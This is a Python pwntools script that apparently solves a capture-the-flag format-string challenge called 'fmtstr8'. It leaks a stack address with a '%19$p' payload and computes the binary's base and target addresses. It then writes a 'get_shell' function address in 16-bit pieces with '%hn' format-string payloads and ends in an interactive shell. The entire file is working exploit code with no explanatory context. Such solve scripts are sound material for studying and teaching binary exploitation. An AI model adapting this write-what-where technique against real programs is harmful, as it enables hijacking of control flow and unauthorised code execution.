#!/bin/python
from pwn import *
exe = ELF('./fmtstr8')

p = process(exe.path)
context.terminal = ['alacritty', '-e']
gdb.attach(p, gdbscript='''
          b*main+97 
c 
           b*main+136
           c
           b*main+322
           c
           ''')
payload = b'%19$p'
p.sendlineafter(b'something: ',payload)
p.recvuntil(b'You said: ')
libc_start_call_main = int(p.recvline(),16)
exe_leak = libc_start_call_main +2040624
fini_array = exe_leak + 0x3d90
write_address = exe_leak + 16536
log.info('fini_array: ' + hex(fini_array))
log.info('libc_start_call_main: ' + hex(libc_start_call_main))
log.info('exe_leak: ' + hex(exe_leak))
get_shell = exe_leak + exe.sym['get_shell']
log.info('get_shell: ' + hex(get_shell))
log.info('write_address: ' + hex(write_address))
#get shell write target: 42
p.sendlineafter(b'> ',b'n')


package = {
         get_shell & 0xffff: write_address, 
         (get_shell >> 16) & 0xffff: write_address + 2,
         (get_shell >> 32) & 0xffff: write_address + 4,

         }
order = sorted(package)

log.info("getshell1: " + hex(order[0]))
payload = f'%{order[0]}c%13$hn'.encode()
payload += f'%{order[1]-order[0]}c%14$hn'.encode()
payload += f'%{order[2]-order[1]}c%15$hn'.encode()
payload = payload.ljust(40, b'\x00')
payload += p64(package[order[0]]) + p64(package[order[1]]) +p64(package[order[2]])
p.sendlineafter(b'something: ',payload)
p.sendlineafter(b'> ',b'n')
this_address = (write_address - 15760) & 0xffff
log.info("this_address: " + hex(this_address))
payload = f'%{this_address}c%42$hn'.encode()
p.sendlineafter(b'something: ',payload)
p.sendlineafter(b'> ',b'n')

p.interactive()
